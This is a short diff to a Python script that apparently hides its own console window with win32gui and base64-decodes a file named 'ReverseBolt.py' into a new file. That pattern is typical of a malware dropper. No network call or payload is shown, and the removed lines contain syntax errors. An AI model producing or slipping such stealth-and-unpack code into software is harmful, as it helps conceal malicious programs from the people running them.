@@ -9,9 +9,9 @@ import base64
 import win32gui, win32con
 
 the_program_to_hide = win32gui.GetForegroundWindow()
-win32gui.ShowWindow(the_program_to_hide , 
+win32gui.ShowWindow(the_program_to_hide , win32con.SW_HIDE)  
 
-with open(ReverseBolt.py'', 'rb') as f:
+with open('ReverseBolt.py', 'rb') as f:
     data = f.read()
 with open('newfile', 'wb') as f:
     f.write(base64.decodebytes(data))
